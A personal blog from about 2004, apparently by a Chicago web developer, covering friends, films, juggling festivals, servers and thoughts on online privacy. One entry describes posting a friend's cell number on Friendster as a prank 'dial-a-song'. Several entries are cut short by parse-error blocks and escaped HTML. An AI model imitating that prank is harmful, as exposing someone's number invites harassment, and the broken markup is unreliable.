                <p>This morning I was on the train and this super cute bundled child got on the train with what I imagine was her father. it coudln&#8217;t havebeen more than 5. since it is cold she was bundled up in such a way that only her mouth, nose and eyes were showing. she was a colorful ball of warm cloth it seemed. soshe and her guardian were standing on the train near me and just chilling. and suddenly out of no where the child opens her mouth and projects vomit all over. it was amazing. not a whole lot of vomit. just the fact that she really didn&#8217;t move. just shot it all over. the guardian character was really good and magically appeared a roll of paper towels and cleaned her up. there also this relaly nice random guy on the train who helped too. sometimes it is nice to see poeple being nice and helping others. sometimes it relaly makes me happy - one time awhile ago - there was this blind guy wondering around on the el - lostish. and like 4 people helped him. from all different &#8220;cliches.&#8221; humanity rules. hahahahah. <br /><br />yesterday was a typical monday. a lot to do at work. sleepy when I get home. finally our tv is workign - so we (hiromi and i) watched the simpsons - then friend - then that 70s show. it was fun and mindless. I really miss that part about my afternoon schedule. as soon as tv broke (which is strangely around the same time I got my tivo) it all ended. I used to love to fall asleep to the simpsons and just chill out(which usually means sleep). <br />then after that I went to get food with matt - where we talked about our complicated lives. it is funny - cuz matt is workign for <a href='http://zellestyle.com/links.html'>liz</a> making <a href='http://zellestyle.com/'>stuff</a> for <a href='http://www.thinkgeek.com'>thinkgeek</a> - so I get to hear about his tough job of hanging out and doing crafts with cool people. hehe. I wish that was my tough job sometimes. although, my tough job is debugging web apps with cool people. so that isn&#8217;t really tough. alas.. <br />anyway.. after I hung out with matt I went to see morgan and we went to this awesome movie called &#8221;<a href='http://www.imdb.com/title/tt0286244/'>Les Triplettes de Belleville</a>.&#8221; So good. it was really weird and I was quite apprehensive about the propect of a cartoon that didn&#8217;t have any dialogue. but it worked out incredibly. so funny. it was really awesome. and increidbly strange. very very surreal. we then went to watusi where we drank our sorrows away. it was fun. although I ended up being late to work this morning - which sucked. I relaly didn&#8217;t mean to as well. all the alarms were set. it was just trouble. stupid stupid trouble. I just spelled trouble wrong twice - the exact same way (i corrected it). but as you might have noticed - I am not one for accuracy in blogging. <br /><br />so yea. things are good. the weather.. (eh thom..) is good. I am having fun hanging out with <a href='http://morgan.attacktexas.com'>morgan</a>, it is very nice. <a href='http://www.therats.org'>matiss</a> is back now. and <a href='http://www.thejugglers.org'>juggling club</a> is tonight! whee..<br /><br />check out <a href='http://war.watership.org'>war.watership.org</a>. I have been updating it regularly. if you would like ot update it as well. let me know. I can hook you up with a really handy bookmarklet that makes updating it easy and fun. <br /><br />today I was listening to venetian snares until my ears died. died I say.<br /><br /> I recently purchased a bunch of 60s art house movies. I am excited. I recently got into older movies after watching <a href='http://imdb.com/title/tt0068833/'>some</a> <a href='http://imdb.com/title/tt0077681/'>70s</a> <a href='http://imdb.com/name/nm0000127/'>wes craven</a> movies. they were really fun. so I picked up <a href='http://imdb.com/title/tt0045274/'>umberto d</a>, <a href='http://imdb.com/title/tt0048434/'>night and fog</a>, <a href='http://imdb.com/title/tt0065531/'>le Cercle rouge</a> and <a href='http://imdb.com/title/tt0052893/'>Hiroshima mon amour</a>. I am pretty excited - they are all very different and probbaly will be depressing. but yea. I also picked up <a href='http://imdb.com/title/tt0230591/'>One Day in September</a> which I also imagine will be sad. but, to counter all the sad movies I got <a href='http://www.rottentomatoes.com/m/AirJawsSharksofSouthAfrica-1108611/preview.php'>air jaws</a> - which is one of my very favorite nature documentaries. w00t. I am glad its winter. so when I hole myself up and watch a bunch of good movies - or maybe not so good movies. heh. we shall see.</p>

                <p>so a week or so ago I went to this party for the <a href='http://www.chicagothong.org/'>chicago thong organization</a>, it was really funny and strange - but my friend chris and I participated in the activities and wore thongs and capes(which was the costume of choice). well later that night we were at a club and one of our friends snapped this really great <a href='http://ambrel.net/android/images/IMG_1453.jpg'>shot of my ass</a>. when I got to work on monday and saw it - I thought immediately how fun(and funny) it would be to send it to my parents in a really nice frame. so I did. it was killing me however - cuz I had to wait quietly in the corner and let them receive it without me blowing the surprise. so today they receieved it. ;) and here is my fathers response (via aim of course): <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

<p>my family rules.<br /><br />hopefully I will receive my <a href='http://danger.com/'>sidekick today</a>. I am hopeing to <a href='http://ironkungfu.com/wiki/index.php/sidekick'>hacking it</a> with the goal being to write some really nifty apps for it. mostly network security tools and blogging utils. I really like the idea of using it only for AIM. hah. I will continue to become a huge nerd. <a href='http://stuffthatisawesome.tripod.com/sitebuildercontent/sitebuilderpictures/gatesmug.jpg'>HUGE NERD</a>. speaking of random linking, check out my friend <a href='http://virtualdarts.typepad.com/'>boone's new blog</a>. he has really taking to blogging with great style and <a href='http://www.studio7imaging.com/images/ultra_fractals/pizazz.jpg'>pizazz</a> (that was a tribute link <b>;)</b>). I think I would like to write a small piece of code into my blog that will link to specific words I define with random images from googles image search. I think that would be entertaining.</p>

                <p>so this weekend was really weird. on friday I hung out and went to bed early because I had to take a practive lsat on saturday. the lsat turned out to be hard. weird. wtf. haha. the logic games were a bit trickier than I previously thought. it was nice to be challenged in a way that I haven&#8217;t been challenged in a long long time. go school. <br /><br />so then on saturday I slept off and on and eventually went out with morgan to this place called trevia - it is nice to hang out with her. then we bought a huge amount of beer and went to this party at texas. it was full of lesbians. it was kinda funny. so we left. but before leaving we were accosted by southside punks. it sucked. they didn&#8217;t really do anything, just were annoying and scary. I am glad nothing happened. it would have been sad to fight someone - since I never have. but yea. so then today - I hung out with morgan and then came home. it is a really weird day out today. and I am not really into going out or anything. which is a bummer - cuz there are some really good shows tonight. the grammies are insane however. hahaha. <br /><br /><br /> i really want to say to the knutson family - that our thoughts are going out to you in this hard time.</p>

                <p>it is true. recently a google employees side/personal project relaly took off. <a href='http://www.orkut.com'>orkut</a> is honestly what I felt friendster could have been . it doesn&#8217;t limit communication to on site. it lets you see the contact info for all your friends and maintain some form of community without limiting yourself to some shoddy infrastructure. I really like how you can create sub groups among your friends, create/be apart of a larger overall subgroup and rate your friends. yea. I am a fan. <br /><br />last night hiromi, matt, morgan and myself all went to see <a href='http://www.rottentomatoes.com/m/Monster-1128647/reviews.php'>monster</a> - it was really good, but incredibly brutal. I was not pleased to be watching it and I really didn&#8217;t appreciate the &#8220;made for TV movie&#8221; theme that it devolved into - regardless if that was how it went in real life. it was just so candy in the end. with that said, it was incredible how well they transformed charlize theron into <a href='http://www.crimelibrary.com/serial4/wuornos/'>Aileen Wuornos</a>. yea, the movie was good - but left a bad taste in my mouth.<br /><br />today I have a meeting apparently for a long time. I am kinda tired and would like to go home. go home and sleep. sleep until the weekend. then sleep some more. sleeping is so much fun. especially when it is cold and snowy. <br /><br />the democratic primaries are kind of sad. I think the onion said it best however: <a href='http://www.theonion.com/4005/top_story.html'>Democrats  somehow lose the Democratic primaries</a>. hehe. how can it be that our country is so confused right now. annoying I think. and <a href='http://www.sfgate.com/cgi-bin/article.cgi?f=/news/archive/2004/02/05/politics0855EST0527.DTL'>sad</a>. I hope bush doesn&#8217;t <a href='http://users.rcn.com/virtual.nai/sot/dow9000h.htm'>win</a>. <br /><br />ok meeting time.</p>

                <p>my shirt is causing my neck to turn red. usually this isn&#8217;t a good thing. but today it is awesome. !!! <br />i got up so early today. it is weird to be up so damn early. nobody is out and around - but somehow I still managed to come to work barely by nine. I don&#8217;t quite understand how this works. I leave my house anywhere from 8-8:30ish and get here everyday at nine. it is insane. I hate getting up so much. I have decided to only sleep. never to get up. stay in bed forever. maybe then there will be a weekly world new article about the fattest 150lb person alive.. so big that he can&#8217;t even leave his apartment. that woudl rule ;)<br /><br />so morgan went to a plushy workshop at the messhall art space last night and made a pretty dope &#8221;<a href='http://morgan.attacktexas.com/archives/000014.php'>animal</a>.&#8221; I kind of wish I had gone. because making stuffed animals is pretty dope. the person who did the workshop has a <a href='http://shawnimals.com/'>dope website</a>. instead of doing the workshop - I ended up going to juggling club - which ended up being good. I was afraid that the space would be lame. but to my surprise it turned out to be not expensive and pretty good. we were able ot play our music. and take up as much room as possible. we even got some other people to come. so it wasn&#8217;t just matiss, mark and myself. but whatever. I am tired of updating this. <br /><br />yea. if you are my friend and want to join orkut - let me know.</p>

                <p>So on Thursday night - I accidentally went and bought some clothes. It was ridiculous. I should never be allowed in to certain far too expensive stores. However I got a hot pair of pants.. not a pair of hot pants mind you.. but yea. So I gotta return some stuff and keep some stuff. I really can?t deal with pants without belt loops ? I just feel insane when I am not wearing a belt. Heh. Yea about that. So then Friday happened. I hung out with chris and we rolled to a <a href='http://www.chicagothong.org/ '>party</a>. it was quite <a href='http://nata2.info/?path=pictures%2Fevents%2Fchicago_thong_04&img=thong%20party%20018.jpg'>insane</a>. but <a href='http://nata2.info/?path=pictures%2Fevents%2Fchicago_thong_04&img=thong%20party%20010.jpg'>chris and I fit in</a>. morgan however was not party to our <a href='http://nata2.info/?path=pictures%2Fevents%2Fchicago_thong_04&img=thong%20party%20014.jpg'>raindeer games</a>. basically it was a political party that was organized by these crazed <a href='http://www.chicagothong.org/ '>chicago thong people</a>. I coudln&#8217;t quite figure out what their deal was - but they were against genetically modified food for sure. chris and I wore these crazy rabbit fur jocks and capes. it ruled. however I hope I never run for <a href='http://nata2.info/?path=pictures%2Fevents%2Fchicago_thong_04&img=thong%20party%20002.jpg'>president</a> I will be totally <a href='http://nata2.info/?path=pictures%2Fevents%2Fchicago_thong_04&img=thong%20party%20015.jpg'>screwed</a>.<br />After that party we dropped morgan off and rolled to vision. Previously in the day I had received <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&img=1075505796-t610(1).jpg'>my rabbit fur coat</a> in the mail from an ebay auction. it cost me 12 dollars(with $7 dollars shipping) and turned out to be pretty good quality. so I decided to wear this jacket in vision. I was rolling like a pimp. p I m p. oh yea. it was brocks bday at vision and everyone was en force. it was fun. however I don&#8217;t suggest not wearing pants in a club. it is quite daunting. I guess that is why pants are often required for club entrance. hmm.. after vision we made it to crobar. I have no idea how this happened. haha. I didn&#8217;t plan on going to crobar at all. but it was a good time and I was happy to see a lot of my friends ;)</p>

<p>oh yea. <br />today is ending up to be a bad day. I just want to go home and sleep. often when I party all weekend with my friends I get up at 3-5 and gotobed around 3-5. that is not a good schedule to try and switch on the fly with the corp. world schedule. stupid corp. world. I want to wear jeans.</p>

I figured it out - basically when I was cleaning out nata2.info I inadvertently changed the permissions on the dir that the photolog puts the photos in. sad day. so I fixed it back. thanks to the guys in #qmail for helping me. ;) <br /><br />today there was a power outage and my server left for about 25 minutes. it was sad. cuz I was helpless. I hate that feeling. <br /><br />i am going to go home now and take a nap. then possibly goto this android thing. hah. how fun. I hope I don&#8217;t stay out tooo late. I need sleep.</p>

                <p>i hate when you get on the train and it is slow. like really really slow. it is dumb. it just took me 6 times to spell that last &#8220;is.&#8221; that made me really mad. haha. I am totally not in the mood for things to exist on a plane that isn&#8217;t convienient or comfortable. <br /><br />last night I talked to <a href='http://www.patrickcornolo.com/'>patrick</a> about getting some work done - and the size of the tattoo grew significantly. it is a bit daunting. iam leery to get a tattoo that is a significant part of my body. I am really into it - but it is now HUGE - whereas before it was just incredibly large. ha. there is an incredible lady of guadelupe/ praying mantis though that I really want. it is quite something. <br />tattoos are such an interestign thing. I really enjoy listening to people talk about their experiences. or what they want/plan. such interestign things..</p>

                <p>I have been workign nigths for WB doing load testing and such - and it is so weird being up from 10-4 or so and then sleeping as much as you can from 4-10 haha. it is hard on me. I get tired real easy and I totally don&#8217;t have the stamina to run around and be merry today. Luckily last night was one of the last ones for awhile. work is going well. we have a lot of things going on that are fun - and soem things that are incredibly frustrating. I hate how people scheme. well I guess I don&#8217;t mind the scheming. I just HATE when people scheme poorly and transparently. it is so dumb. arrrgghh.. but whatever. it will work itself out. it is just lame. it is like the tattletailers in kingdergarten. bastards. haha. <br /><br /> in other news my site <a href='http://nata2.info'>nata2.info</a> has pulled an aproximate avereage of 50g of bandwidth per day this last month or so. that is roughly 1.5 terabytes of bandwidth. holy hell. I remember once I was supposed to pay $50 for every 50g I used a month. haha. I am glad that isn&#8217;t happening at my current colo space. ;) r0x0r. now if I just add those damn servers. ;) I think I am going to attempt to drive out there sometime in the next two weeks. it will rule. I am gunn have to remember how to do it all ;) drive that is. oh and modify a BSD firewall. heh. <br /><br /> here is an incredible article about the <a href='http://edmunds.com/advice/buying/articles/42962/article.html'>car salesperson world</a>.</p>

                <p>so today I had a weird day at work. nothing happened - I just felt weird. so I went home and attempted to take a nap to relax myself. but that didn&#8217;t work. I couldn&#8217;t sleep. I needed to just screw around or hang out and say stupid shit to people. so I got matt and we walked to the local bar. it ruled. we drank $20 worth of beer - which on an empty stomach is PLENTY. but anyway. matt and I hugn out until about 8. which was a great time. totally chilled me out. we just talked trash about our lives until we were bored - which is exactly what I needed. after that I went to dinner in wicker park with morgan. I was a bit tipsy - so I hung out with the homeless guys first. I told them jokes. bad jokes. they even dissed my delivery ;) it ruled. then I went home, first buying candy. I am now drinking a assload of dr. pepper. and will soon move on to the sour patch kids and or skiddles. I am working tonight - load testing. so now that I am sober I need to stay awake. haha. my life rules.<br /><br /></p>

<p>My friend thom rules. I like talking to him. <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

                <p>in fact I really didn&#8217;t do much. I honestly barely made it to work. but on;y because I was so tired from working last night. I don&#8217;t know what the deal was.. I was dieing. I drank soo much pop and candy - I think I surpassed the point of it being helpfuland it became a method of sedation. stupid sedation. I am sitll in love however with wireless internet. so before any asks.. yea I like it. <br /><br />to all those I sent that really lame email to. it was fun and I have never done one. so I felt compelled to experiment. isn&#8217;t this the time to experiment with things that can affect your life adversely? when you are a teenager? I thought so. <br /><br />whew. I am wearing my bling to make up for my unshaven appearance. it is weird. I don&#8217;t thin ki am fooling very many people. ;)<br /><br />tonight I think I am going to help my friend <a href='http://heroshomework.com/default.html'>elisa</a> with some stuff and then hopefully clean my apartment. I ned to do this before hiromi gets home. I think she will die if she sees it in the state it is in. we are dirty dirty boys. I accidently posted a <a href='http://grouphug.us/confessions/488219660'>confession to grouphug</a> - just kidding. I didn&#8217;t. but that site is incredible. I donated money to them and so shoudl you. <br /><br />learn about how the <a href='http://www.newsday.com/news/health/ny-hscov0127,0,442476.story?coll=ny-health-headlines'>shuttle broke</a>. learn why you shoudl vote <a href='http://www.blackstarsblog.com/bushin41point2.htm'>democratic in 2004</a>. Our <a href='http://learntoyoyo.com'>yoyo site</a> is roxor. <br /><br />oh and my server is gettign POUNDED by this damned new virus that is out. I am not a fan. I am a fan of the shins - however. and caring is totally creepy. but somehow I broke my <a href='http://nata2.info/?path=code%2Fmms2blog'>MMS2blog</a> thing. sad day. I don&#8217;t know why. it just stopped working. and started losing emails. everything seems to be configured the same. so I have no clue what is goign on. weird.</p>

                <p>this is a long entry<br /><br /> heh. I wish I really was a darksider. I have had some really weird dreams the past couple days. first I had a dream I was in a bad place. the place was a bed and the other person in the bed didn&#8217;t want me there but I couldn&#8217;t leave - so I was attempting to stay on the edge of the bed the whole night. it was an incredibly strange dream - I imagine that a dream analysis person would have a hayday. haha. <br />the next one was this morning - I dreamt that I had a gun. like I bought a gun or just acquired it. I loaded it and learned how to use it - at work. but the gun took batteries. I remember unloading and loading it over and over again. and my coworker showed me how to make sure no bullets were in it. what makes it weird was that I thought &#8220;wow - I have an illegal gun, cuz I don&#8217;t have a foid card.&#8221; wtf. why is that important - I usually don&#8217;t worry so much about dreams and laws. so my battery gun was a bit entertaining. in the dream I thought about how to introduce it to my roomies and where to keep it. I felt more secure. <br />the next dream was when I feel asleep on the train comign to work. it was about a stage show where I am able to perceive what people say without listening to them. so I am tied up and my ears are plugged very well. and my friend mark was the lead guy - and he explained the trick and got a volunteer. the volunteer came up on stage and shot mark in the face, killed me and then killed himself. I woke up around this part - but continued to entertain the dream for awhile and wondered what the audience would do. weird. I woudl probably run.<br /><br />i have been representing my bad self on that <a href='http://pub72.ezboard.com/fnycjugglingfrm4.showMessageRange?topicID=384.topic&start=21&stop=25'>nyc juggling b board</a>. someday they will realize that I can ownzer them. hah. <br /><br />it has been a nice time hanging out with morgan. it is weird - cuz I don&#8217;t really date people. and when I find myself dating someone - I am like &#8220;wtf&#8221; - it rules. apparently she has nicknamed me future man, which is a name I have wanted to be called for YEARS. years I tell you. finally someone understand my time disjointed-ness. <br /><br />i have been reading <a href='http://grouphug.us'>grouphug.us</a> incessently. I think it is obviously a guilty vouyeristic pleasure. I mean.. why else woudl you read a bunch of peoples confessions for incredibly fucked up stuff. it is madness. but it makes me wonder about how the internet is shaping our youth. an aweful lot of the posts reference an age which I would say is too yougn to experience advanced drug and sex abuse. but these youth are channeling their feelings and thoughts into this site. I also know that a lot of youth are using blogs much the same way. combine this style of site, blogs and then the webcam culture and you have completely destroyed the contemporary idea of privacy. I really wonder what privacy will be like whn I have children. I konw it won&#8217;t be weird to have security cameras logging everything all over a house, this will of course be logged to a network - which will run most media. so the entire house will be unprivatized (ha). Haxor kids will be able to watch there parents do drugs and attempt to hide it. the parents will use the technology but not understand it. a whoel new genre of porn will appear.. wait this is completely different than the topic I was talkign about. I guess my queston is: what will the face of the next generation be like - when they grow up with the potential for millions of people to participate in their life - adn thus negating any traditional sense of privacy? <br />i have no idea - but when I talk to someone who has blogged as long as I have but they are 5 years younger - I think their personality is altered. I am interested to see the kids who grow up on blogs. who are blgged about as babies - who blog to grandma in school. how will they react to government regulating privacy. will they react. will privacy exist. am I a dork? these are all questions I want to know. <br /><br /> <a href='http://www.nata2.info/pictures/misc/phone_camera/photolog/1075081908-t610%283%29.jpg'>better watch out</a>. <br /><br />i want to either: goto law school and do tech. law, goto grad school and study sociology and community networks, do mobile computing stuff, or not do anything and remain where I am. none of that will happen soon. but I shoudl plan - I suppose.<br /><br />hmm. I am glad I am over my blogging funk. I feel a bit more open. I think I might start bearing my soul. hah. lies. I will not. but I will addict everyone to blogs. check out <a href='http://morgan.attacktexas.com'>morgan's new blog</a> and also check out <a href='http://virtualdarts.typepad.com/virtual_darts/'>boone's blog</a>. also check out my newish site: <a href='http://www.attacktexas.com'>attacktexas.com</a> - it isn&#8217;t quite how I imagined but it works. <br /><br />i need to upgrade my servers so bad. nata2.info is becomign a bane to my existence. last night I resized all the old images down to 640x480 and saved around 600mb. what the hell was I thinking. I also posted the <a href='http://nata2.info/?path=pictures%2Fjuggling%2Ffestivals%2Fmadfest_04'>madfest pictures</a>. I will post video later. especially now that I have 600mb free. be sure and check out <a href='http://marcusmonroe.com/'>marcus monroes</a> chainsaw <a href='http://nata2.info/pictures/juggling/festivals/madfest_04/madfest04%20006.jpg'>injury</a></p>

                <p>today I got up late for work again. it is stupid. I recently oredered a new alarm clock. it is a sony sleep machine. but it doesn&#8217;t get me up. I just sleep through the alarm. so if I forget to set my phone to ring.. I won&#8217;t ever get up. I hate it. I need to replace my new alarm clock with my old one. my old one is super sketchy too. dayum alarm clocks. I am upset about my lack of ability in floating to work. why can&#8217;t I apparate?<br /><br />there are a <a href='http://www.lumpen.com/buddy/yes.html'>couple of parties</a> this weekend. I hope to goto. I can feel the need to hibernate coming on. I really need to win. hopefully my winning will be soon. <br /><br />last night <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1074830443-t610(1).jpg'>kinnera</a> came over and we got dinner. it ruled. she is fun. she also has <a href='http://www.nata2.info/?path=pictures%2Fmisc%2Fphone_camera%2Fphotolog&amp;img=1074831641-t610(1).jpg'>quite the bling</a> - always fun. speaking of bling. I shoudl get some soon. I really want a big ring that says something awesome. morgan suggested &#8220;futureman,&#8221; but that seems too big of a word. I woudl have to use a really little font. maybe two rings.. on that says &#8220;love&#8221; on one hand and &#8220;hate&#8221; on the other.. haha.. maybe I should get my <a href='http://www.mrbling.com/'>grill done</a>.<br /><br />i love listening to sad pretty music.. the microphones are so good at being that. I want more. a friend suggested the books - but I don&#8217;t konw anything baout them. I guess I should check them out.<br /><br />so that pinguin game is &#8220;sweeping&#8221; the net. hehe. nobody can get higher than 323.5 or whatever.. except if you use this <a href='http://www.szanalmas.hu/pingu/'>hacked version</a>. ;)<br /><br />my neck hurts.</p>

                <p>well maybe not quite that extreme - but a bunch of cool/fun things happened today. first I was attacked on a <a href='http://pub72.ezboard.com/fnycjugglingfrm4.showMessage?topicID=384.topic'>juggling</a> b board about my rattail - so I defended&#8230; a bit unsuccessfully - but I tried. then I am going to be helping with a secret project. which is going to rule. <br /><br />last night I yoyoed a bunch with mark.. and then hung out with morgan. it is nice to hang with morgan.. that is bit unexpected. but I am enjoying it altogether. and apparently my new name is futureman which is an incredible name. <br />tonight I am going to dinner with kinnera and I finally get that damn belt back. stupid rockers stealing my stuff. ok. this is a pretty topicless nonsensical rant of a post - I will stop now.</p>

                <p>so madfest ruled this weekend. I had a bunch of fun. on friday - I picked my mom, brother and sarah up from the airport adn picked up our rental car. the car happened to be the largest car I have ever driven - a ford expedition. it was huge. I felt like I was in a semi. heh. but we all piled in and drove to brads house and picked him up. we then drove to madison and went to bed. on saturday we woke up bright and early and juggled until around 5. there were some AMAZING yoyo-ers and it was great to talk to them and learn new tricks. I can almost do the spirit bomb. SOMEDAY.. SOMEDAY. after juggling we went to the show - which was awesome<br />on sunday we got up and juggled more (weird) and I totally blew the 7 club endurance competition. it sucked. I was sad. we hung out a bit then came home. <br /><br />i relaly don&#8217;t want to write rigthnow. I am tired of typing. so I will wait until later. maybe when I post the pictures</p>

&lt;br .last night was crazy. I played yoyo website. it is almost to a point where I can release it. but I still have a lot to do. eep. hopefully I wil lbe able to work on it a bit during lunch today. I totally slept through my alarms today. it sucked - I have honestly been attempting ot come into work before nine (mostly cuz I get into trouble otherwise, but I really like getting here earlier - I get more done and can leave earlier), but this morning was really tough. I totally blew it. I looked up at the clock and it said 9:30 - so I got up called my boss and sheepishly went to work. I hate that feeling.. of being late. eep. so bad. anyway.. &lt;br /&gt;</pre><br />i hung out with morgan again last night. it was fn. we hung out with matt and edie and some of their friends. they played a bunch of games.. I showed morgan my yoyo work. it is funny - cuz I am sooooo nerdy.. yet strangely I feel the need to parade my nerdiness around like a rockstar, which is what I am. I have fans. ;) <br /><br />mad fest starts tonight. it is gunna ROCK!</p>

                <p>the last couple days I have been working in all my spare time to finish this <a href='http://learntoyoyo.com'>yoyo website</a>. I think it is going to be really fun. I will be doing a bunch of fancy things to make it good. I am excited to attempt a new website. I haven&#8217;t made one in a couple of weeks. video editing is different. I think we need to eventually reshoot a bunch of stuff. but that is &#8220;ok.&#8221; heh. <br /><br />i have been listening to the &lt;A href=&#8221;http://www.amazon.com/exec/obidos/ASIN/B00005NB2Q/nata2productions&#8221;&gt;microphones - the glow pt 2&lt;/a&gt;. it is really nice - a lot of noise. I enjoy the noise right now. I don&#8217;t know why. I have been hanging out with morgan a bunch. it is fun. I also enjoy that noise.. although it is keeping me from doing websites. ;) but that is a nice change. I recently made her a couple cds - they are pretty funny. I always laugh whenever I make someone cds - especially if I want to impress them. cuz you don&#8217;t want the cds to be crap - but you don&#8217;t want to scare the person away by showing them what you really listen to (this may be the case only for me - ahhh death metal). but I instead made a black metal cd (which is incredible) and then a regular screaming/doom/death metal cd. hahaha. metal cds for a girl. wtf. it is awesome. <br /><br />tomarrow my mom, brother and his fiance all come to town for the madison juggling festival. we will drive up to madison tomarrow night (when <a href='http://nata2.info/pictures/Incoming/matiss.gif'>damned matiss</a> gets out of work) and stay there until sunday. lots and lots of juggling. I plan to get some yoyo in and hope to PASS a BUNCH with my brother. hopefully it will be ffun andhe won&#8217;t lose his arms like last time. damn arms. <br /><br />at work I recently got a new computer. it rules. I love new computers.. now all I gotta do is await my bling&#8230;</p>

                <p>So I have been trashing my blog by quoting aim and such. it is nice and humorous but it totally throughs of the blog feel and makes it kinda childish. I really don&#8217;t like it. but I am still laughignabout this prank I pulled on my friend scott - so I will share it with yall.. it is the last one for awhile.. (unless I continue to be awesome)<br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;bR&gt;So the setup was that I wanted to play a joke on scott. I was posting random stuff to friendster and I came up with the idea of posting scotts cell phone number to friendster as a &quot;dial a song.&quot; so I did it. here is my post:&lt;blockquote&gt;&lt;small&gt;
check out all the new chicago music by calling&lt;br /&gt;
chicagos new dial-a-song. call:&lt;br /&gt;
8xx-xxxxx-x0&lt;br /&gt;
it rules...&lt;br /&gt;
&lt;/small&gt;&lt;/blockquote&gt;
I posted it and waited a long time. it sucked. I hate waiting. I thin I could never go to war... cuz the waiting would bother me.. not the killing.. ;) I eventually broke down and told broox about it: &lt;blockquote&gt;&lt;small&gt;</pre></p>

                <p>for the love of god it was a great weekend. Work has been interesting. a lot of drama and going forwards-ness. it is nice. finally stuff is getting done. but at the expense of a lot of comfortability and weird weird situations. anyway..<br /><br />On friday I came home and took a nap. I talked with ladawn a bunch on the phone which was awesome, she seems to be doing wonderful. I decided that my room is a complete mess, but I am going to have to deal with it :( - whatever. so I went to sushi wabi with liz and scott. it was awesome. we had an intervention with eac other. I talked nonsense.. since I was insane&#8230; but we hugn out with chris, tyson, felix and dave the hustler. it was dope. those guys are prtty funny. we then all went with felix to crobar where him and the virgin tears &#8220;spun.&#8221; it turned out to be an incredible night. a seriously incredible night. amjad showed up. everything ended up working out. I didn&#8217;t get home until 6:30 or so. awesome. I loved it. one of the best moments was when scott experimented with the bathroom attendent at crobar. he gave him a 20 and then continued to tip him everytime he went to the basthroom. this ensured that no matter what the line was scott was able to get in first. it was awesome. really funny. we laughed a lot. ahhh&#8230; to have diposable income. I suppose I should purchase a condo. <br /><br />&#8230;.then on saturday I got up late - like 5ish. it was awesome. I hung out a bit and then went over to morgans house. we watched escape from ny and then got food.. and then watched the hulk. we attempted to watch purple rain. but it didn&#8217;t pan out. it is nice to hang out.. and not really go out. so often I go out and it is craziness.. staying in an chillin is really relaxing. <br /><br />today I got up early and headed to marks place to relax and film yoyo videos. we spent a long time talking abotu it and getting the lights finalized. but in the end it worked out really good. it was really fun and quite silly. some great shots. I will atempt to post some tonight.. ahhh&#8230; having a DV cam is fun. and the mini DV is so tiny.. <br /><br />word I am sleepy. time to goto bed ;)</p>

                <p>I was glancing at my order history on amazon.com and I noticed that I have ordered a lot of stuff. I shoudl relaly save my money I suppose. here is a breakdown. a lot of these orders may have been one book. or may have been many books. &lt;blockquote&gt;&lt;small&gt; 2 orders in 1997<br /> 5 orders in 1998<br /> 5 orders in 1999<br /> 14 orders in 2000&lt;bR&gt; 16 orders in 2001<br /> 32 orders in 2002<br /> 38 orders in 2003<br /> 4 orders in 2004<br /> &lt;/small&gt;&lt;/blockquote&gt;So yea. I feel silly. but whatever. I guess amazon has become quite the online retailer.. or shoudl I say e-tailer.. haha. I wonder whatever happened to cdnow. and I bet you can&#8217;t guess when I was in college ;)</p>

I love candy. matiss, morgan and I ordered pizza and watched terminator 3 (which was lame). the night ruled. <br /><br />yea yea. I got up early today and was at work by 8:45. that is wrong. it should never be that way. I should always be able to sleep until 11 at least. <br /><pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML:

                <p>today I woke up on the wrong side of the bed.. which is incredibly hard.. since there is a wall in the way.. but however I managed it.. I am totally backwards and screwed up today. it is a pain. first off I locked myself out of my apartment.. I wasn&#8217;t even ready to leave.. but I left.. then realized I didn&#8217;t have anything but my cell phone.. so I was able to call and wake matiss to have him let me in. but.. I felt bad. and it sucked. and then.. fo soem reason - even though I left my house around 8:25 I wasn&#8217;t able to get to work at the propsed 8:50 that I attempted. it didn&#8217;t make a damn bit of sense. I can leave my house at 8:40 and get their by 9:10 any day of the week.. but attempting to get there before 9 is IMPOSSIBLE apparently. <br /><br />last night I hung out with hiromi and matiss after having a really fun dinner wiht morgan. w00t. I made a surprise for my friend <a href='http://home.kimo.com.tw/pzantique/main.htm'>ella</a> which hiromi is bringing to taiwan. I am excited. <br /><br />today!! sad song day&#8230; wheeeee</p>

                <p>so the other day I decided to pick up a <a href='http://jabra.com/products/FreeSpeak_Photo1.html'>Jabra Freespeak</a> bluetooth headset for my t610. When wearing it I feel as though I am in the future. I thought about getting the <a href='http://www.nextlink.to/bluespoon/index.htm'>digital bluespoon</a> but i felt bad paying more for the headset than i did for the phone. so i guess that will have to wait for when i get my <a href='http://www.nokia.com/nokia/0,4879,33210,00.html'>6600</a>.</p>
<a href='http://www.howardforums.com/showthread.php?s=&amp;threadid=143273'>here is an awesome review of the bluespoon</a><a href='http://www.howardchui.com/modules.php?name=Sections&amp;sop=viewarticle&amp;artid=142&amp;page=3'>here is a poor review of the jabra</a>
<p>One of the factors i used in making my decision was reading <a href='http://www.russellbeattie.com/notebook/1005523.html'>Russell Beatties's</a> write up and it seemed like he was very happy with it. so i thought.. maybe it isn&#8217;t that bad.. and it is cheap.</p>

<p>Now if I could get it to pair appropriately with my desktop - I could maybe use it as a VOIP headset.. and call my friends all over the world!</p>

